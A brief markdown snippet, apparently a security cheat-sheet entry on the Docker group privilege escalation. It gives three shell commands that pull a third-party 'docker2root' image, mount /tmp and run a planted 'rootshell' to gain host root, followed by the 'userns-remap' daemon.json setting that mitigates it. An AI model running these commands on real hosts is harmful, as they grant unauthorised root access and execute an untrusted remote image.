```shell
 docker run -v /tmp:/persist sabbath666/docker2root /bin/sh root.sh
 ls -la /tmp/rootshell 
 ./rootshell
```
# Remapping UID:
/etc/docker/daemon.json

```json
{
  "userns-remap": "default"
}
```
